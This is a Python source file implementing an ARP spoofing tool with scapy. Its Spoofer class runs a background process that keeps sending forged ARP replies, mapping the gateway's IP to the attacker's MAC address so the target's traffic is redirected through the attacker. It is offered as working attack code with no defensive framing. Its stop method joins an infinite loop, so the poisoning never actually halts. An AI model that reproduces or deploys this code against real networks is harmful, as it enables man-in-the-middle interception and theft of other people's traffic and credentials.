
import logging
from multiprocessing import Process
import time
from scapy.layers.dns import DNS
from scapy.layers.inet import UDP
from scapy.layers.l2 import Ether, ARP
from scapy.all import sendp


class Spoofer():
    def __init__(self, interface: str, attacker_mac: str, gateway_mac: str, target_mac: str, gateway_ip: str, target_ip: str, interval = 0.5, verbose:bool = True) -> None:
        self._arp_poisoning_process = Process(target=self.send_arp_poisoning_packet)
        self._interface = interface
        self._attacker_mac = attacker_mac
        self._gateway_mac = gateway_mac
        self._target_mac = target_mac
        self._gateway_ip = gateway_ip
        self._target_ip = target_ip
        self._interval = interval
        self._verbose = verbose

    # start the process of sending the arp poisoning packets
    def start_poisoning(self):
        self._arp_poisoning_process.start()
        self._log("ARP Poisoning Started")
    
    # stop the process of sending the arp poisoning packets
    def stop_poisoning(self):
        self._arp_poisoning_process.join()
        self._log("ARP Poisoning Stopped")

    # sends arp poisoning packets to the victim
    def send_arp_poisoning_packet(self):
        while True:
            ether = Ether(dst=self._target_mac, src=self._attacker_mac)
            arp = ARP(
                op="is-at",
                psrc=self._gateway_ip,
                hwsrc=self._attacker_mac,
                pdst=self._target_ip,
                hwdst=self._target_mac,
            )
            packet = ether / arp
            sendp(packet)
            time.sleep(self._interval)

    # logs the message if in verbose mode
    def _log(self, msg: str):
        if self._verbose:
            logging.info(msg)